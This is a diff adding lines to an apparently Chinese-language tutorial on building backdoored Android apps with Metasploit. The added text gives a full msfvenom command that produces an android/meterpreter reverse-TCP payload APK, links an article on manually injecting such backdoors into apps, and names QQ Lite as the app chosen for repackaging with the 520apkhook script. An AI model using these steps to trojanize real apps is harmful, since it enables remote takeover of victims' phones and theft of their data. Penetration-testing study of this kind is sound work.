@@ -216,6 +216,16 @@ sudo ./msf
 
 ## 用520apkhook创建带有后门的apk文件
 
+MSF自身本来就可以创建带有后门的APK程序，不过就是一个简单的`MainActivity`，我们还要把它压进我们的程序里
+
+```bash
+msfvenom -p android/meterpreter/reverse_tcp LHOST=<host> LPORT=5555 R > pentestlab.apk
+```
+
+这个比较麻烦（有时间再补），所以我这里用Github上别人写好的脚本
+
+<!-- [实用教程：手动安卓应用中注入msf后门 - 知乎 (zhihu.com)](https://zhuanlan.zhihu.com/p/27666919) -->
+
 这里我选用的是QQ轻聊版（name='com.tencent.qqlite' versionCode='174' versionName='3.5.0'）
 
 首先我们要把520apkhook给clone下来才能用
